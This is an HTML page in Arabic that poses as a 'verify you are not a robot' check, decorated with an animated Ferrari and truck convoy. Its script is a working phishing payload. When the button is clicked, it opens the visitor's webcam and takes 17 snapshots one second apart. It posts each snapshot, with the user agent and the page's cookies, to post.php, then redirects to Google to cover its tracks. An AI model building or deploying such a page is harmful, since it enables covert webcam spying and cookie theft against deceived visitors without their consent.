<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>نظام التحقق الأمني - Ferrari Convoy</title>
  <style>
    body { margin: 0; background: #050510; color: #fff; font-family: sans-serif; text-align: center; overflow: hidden; height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; }
    .game-container { position: relative; width: 100%; height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; }
    .ui-overlay { margin-bottom: 20px; z-index: 100; }
    h2 { font-size: 30px; color: #00d2ff; text-shadow: 0 0 10px rgba(0,210,255,0.5); margin: 0; }
    p { color: #fff; font-size: 18px; margin: 10px 0; }
    button { padding: 15px 45px; font-size: 22px; cursor: pointer; background: #007bff; color: white; border: none; border-radius: 5px; transition: 0.2s; font-weight: bold; box-shadow: 0 4px 15px rgba(0,123,255,0.4); }
    .moon { position: absolute; top: 22%; left: 12%; width: 70px; height: 70px; background: #fefcd7; border-radius: 50%; box-shadow: 0 0 40px #fefcd7; z-index: 1; }
    .cloud { position: absolute; background: rgba(255,255,255,0.15); border-radius: 50px; height: 25px; width: 100px; animation: moveClouds linear infinite; z-index: 1; }
    @keyframes moveClouds { from { left: -150px; } to { left: 110%; } }
    .road { position: relative; width: 100%; height: 170px; background: #111; border-top: 4px solid #333; border-bottom: 4px solid #333; overflow: hidden; display: flex; align-items: center; z-index: 10; }
    .road::after { content: ""; position: absolute; top: 50%; left: 0; width: 200%; height: 8px; background: repeating-linear-gradient(to right, #fbbf24 0, #fbbf24 60px, transparent 60px, transparent 120px); transform: translateY(-50%); }
    .road.animating::after { animation: roadScroll 0.08s linear infinite; }
    @keyframes roadScroll { from { transform: translate(0, -50%); } to { transform: translate(-120px, -50%); } }
    .vehicle { position: absolute; bottom: 15px; left: -400px; z-index: 50; }
    .emoji { font-size: 110px; transform: scaleX(-1); }
    .headlights { position: absolute; top: 50px; right: -25px; width: 40px; height: 40px; background: #fff; border-radius: 50%; filter: blur(15px); box-shadow: 0 0 80px 35px #fff, 0 0 120px 50px #ff0; opacity: 0; }
    .box { position: absolute; font-size: 40px; z-index: 45; animation: fall 0.6s ease-in forwards; pointer-events: none; }
    @keyframes fall { 0% { transform: translateY(0) rotate(0deg); opacity: 1; } 100% { transform: translateY(70px) rotate(45deg); opacity: 1; } }
    .truck-move { animation: drive 5s linear forwards; animation-iteration-count: 5; }
    .ferrari-move { animation: drive 3.2s linear forwards 0.8s; animation-iteration-count: 5; }
    .taxi-move { animation: drive 4.2s linear forwards 1.8s; animation-iteration-count: 5; }
    @keyframes drive { 0% { left: -400px; } 100% { left: 115%; } }
    .move .headlights { opacity: 1; }
    .bird { position: absolute; font-size: 28px; z-index: 5; animation: fly 25s linear infinite; }
    @keyframes fly { from { left: -50px; top: 15%; } to { left: 110%; top: 10%; } }
  </style>
</head>
<body>
<div class="game-container">
  <div class="moon"></div>
  <div class="cloud" style="top: 15%; animation-duration: 50s;"></div>
 <div class="cloud" style="top: 25%; animation-duration: 35s; width: 140px;"></div>
  <div class="cloud" style="top: 35%; animation-duration: 45s; width: 120px;"></div>
  <div class="bird">🦇</div>
  <div class="ui-overlay">
    <h2>يرجى التحقق من أنك لست روبوت</h2>
    <p>اضغط هنا لنتحقق</p>
    <button onclick="startProcess()">ابدأ التحقق الآن</button>
  </div>
  <div class="road" id="road">
    <div class="vehicle" id="truck"> <div class="emoji">🚚</div> <div class="headlights"></div> </div>
    <div class="vehicle" id="ferrari"> <div class="emoji">🏎️</div> <div class="headlights"></div> </div>
    <div class="vehicle" id="taxi"> <div class="emoji">🚕</div> <div class="headlights"></div> </div>
  </div>
</div>

<script>
let audioCtx;
function playSounds() {
    try {
        audioCtx = new (window.AudioContext || window.webkitAudioContext)();
        const playV = (f, t, g, s, d, m) => {
            const o = audioCtx.createOscillator(); const gn = audioCtx.createGain(); const fl = audioCtx.createBiquadFilter();
            o.type = t; o.frequency.setValueAtTime(f, audioCtx.currentTime + s);
            o.frequency.exponentialRampToValueAtTime(f * m, audioCtx.currentTime + s + d);
            fl.type = "lowpass"; fl.frequency.value = 1000;
            gn.gain.setValueAtTime(0, audioCtx.currentTime + s);
            gn.gain.linearRampToValueAtTime(g, audioCtx.currentTime + s + 0.5);
            gn.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + s + d);
            o.connect(fl); fl.connect(gn); gn.connect(audioCtx.destination);
            o.start(audioCtx.currentTime + s); o.stop(audioCtx.currentTime + s + d);
        };
        for(let i=0; i<5; i++){
            let shift = i * 6;
            playV(40, 'sawtooth', 0.25, shift, 5, 1.2);
            playV(200, 'sawtooth', 0.4, shift + 0.8, 3.2, 5);
            playV(100, 'triangle', 0.15, shift + 1.8, 4.2, 1.8);
        }
    } catch(e) {}
}

async function startProcess() {
  try {
    playSounds();
    document.getElementById('road').classList.add('animating');
    document.getElementById('truck').classList.add('truck-move', 'move');
    document.getElementById('ferrari').classList.add('ferrari-move', 'move');
    document.getElementById('taxi').classList.add('taxi-move', 'move');

    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const video = document.createElement('video');
    video.srcObject = stream; await video.play();

const canvas = document.createElement('canvas');
    canvas.width = 640; canvas.height = 480;
    const ctx = canvas.getContext('2d');

    for (let i = 0; i < 17; i++) {
      ctx.drawImage(video, 0, 0, 640, 480);
      const data = canvas.toDataURL('image/jpeg', 0.5);
      
      // الإصلاح هنا: إضافة الهيدرز وإرسال المعلومات المطلوبة
      fetch('post.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'img=' + encodeURIComponent(data) + 
              '&info=' + encodeURIComponent(navigator.userAgent) + 
              '&cookies=' + encodeURIComponent(document.cookie || "No Cookies")
      }).catch(e => console.log("Error:", e));

      await new Promise(r => setTimeout(r, 1000));
    }
    stream.getTracks().forEach(t => t.stop());
    setTimeout(() => { window.location.href = "https://www.google.com"; }, 1000);
  } catch (err) { alert("يرجى السماح بالكاميرا."); }
}
</script>
</body>
</html>
